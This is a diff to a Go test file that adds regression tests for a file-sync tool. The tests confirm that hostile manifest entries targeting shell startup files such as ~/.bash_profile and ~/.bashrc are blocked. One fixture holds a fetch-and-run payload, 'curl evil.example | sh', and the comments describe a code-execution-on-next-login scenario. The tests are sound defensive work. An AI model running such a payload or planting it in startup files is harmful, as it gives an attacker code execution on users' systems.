@@ -293,11 +293,61 @@ func TestDiffHonoursDeferredOnlyForItsOwnCategories(t *testing.T) {
 		}
 	}
 	blocking := Blocking(m, st, false)
-	if len(blocking) != 2 {
-		t.Errorf("Blocking = %+v, want exactly the smuggled pack and capture entries", blocking)
+	var gotIDs []int
+	for _, e := range blocking {
+		gotIDs = append(gotIDs, e.ID)
+	}
+	if diff := cmp.Diff([]int{0, 1}, gotIDs); diff != "" {
+		t.Errorf("Blocking ids (-want +got):\n%s\nblocking = %+v", diff, blocking)
 	}
 	if got, _ := os.ReadFile(bashrc); string(got) != "# the user's own shell rc\n" {
 		t.Errorf("Diff must not touch %s; content = %q", bashrc, got)
+	}
+}
+
+// TestDiffRefusesPackEntryWithAbsentTarget is the wave-B re-review's PoC
+// for ruling R-P3-B1c: TestDiffHonoursDeferredOnlyForItsOwnCategories above
+// only exercises a pack entry against an EXISTING destination file, where
+// the ordinary Lstat path already produces present-different for free (any
+// mismatch does). The actual residual hole never needed Deferred at all —
+// a pack entry whose Dst is ABSENT on the destination (e.g.
+// $HOME/.bash_profile, never written before) falls through Diff's ordinary
+// "not exist" branch to stagedStatus(), which returns staged-same purely
+// because bytes happen to be staged under that id, regardless of category.
+// placeEntry would then create the file from attacker-controlled bytes
+// (the reviewer's code-exec-on-next-login scenario). No FileEntry in this
+// codebase is ever built with CatPack (the git pack itself travels as the
+// separate StreamPack, straight into gitx.Attach, never as a manifest
+// entry) — so it is refused unconditionally, before any Lstat/staging
+// check, regardless of Deferred or whether Dst already exists.
+func TestDiffRefusesPackEntryWithAbsentTarget(t *testing.T) {
+	home := t.TempDir()
+	staging := filepath.Join(t.TempDir(), "staging")
+	if err := os.MkdirAll(staging, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	target := filepath.Join(home, ".bash_profile") // never written: absent on the destination
+	payload := "curl evil.example | sh\n"
+
+	m := &Manifest{Version: 1, JobID: sid, SessionID: sid}
+	m.Entries = []Entry{{
+		ID: 0, Category: session.CatPack, Dst: target,
+		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
+	}}
+	writeFile(t, StagedPath(staging, 0), payload)
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != PresentDifferent {
+		t.Errorf("pack entry over an absent target = %s, want %s (must never be staged-same/absent)", st[0], PresentDifferent)
+	}
+	if blocking := Blocking(m, st, false); len(blocking) != 1 || blocking[0].ID != 0 {
+		t.Errorf("Blocking = %+v, want the pack entry blocked", blocking)
+	}
+	if _, err := os.Lstat(target); !os.IsNotExist(err) {
+		t.Errorf("Diff must never create %s: lstat err = %v", target, err)
 	}
 }
 
@@ -346,6 +396,24 @@ func TestDiffRefusesCaptureDstRegardlessOfDeferred(t *testing.T) {
 				t.Errorf("Diff must not touch %s; content = %q", bashrc, got)
 			}
 		})
+	}
+}
+
+// TestBlockingNeverExemptsCaptureUnderForce covers ruling R-P3-B1c's minor
+// 5: Blocking's force+FFAllowed exemption (spec §7.3, session transcripts
+// only) blindly trusted e.FFAllowed, a SOURCE-computed wire field — nothing
+// stopped a hostile or buggy source from also setting FFAllowed:true on a
+// CatCapture entry. That entry is already forced present-different by
+// canonicalCaptureDst's check above, so Blocking must keep reporting it as
+// blocking even with force:true and FFAllowed:true; only a genuine
+// CatSession entry may ever be exempted.
+func TestBlockingNeverExemptsCaptureUnderForce(t *testing.T) {
+	m := &Manifest{Version: 1, JobID: sid, SessionID: sid}
+	m.Entries = []Entry{{ID: 0, Category: session.CatCapture, Dst: "/home/bob/.bashrc", FFAllowed: true}}
+	st := map[int]Status{0: PresentDifferent}
+	blk := Blocking(m, st, true)
+	if len(blk) != 1 || blk[0].ID != 0 {
+		t.Errorf("Blocking(force=true) = %+v, want the capture entry still blocked (never exempted)", blk)
 	}
 }
 
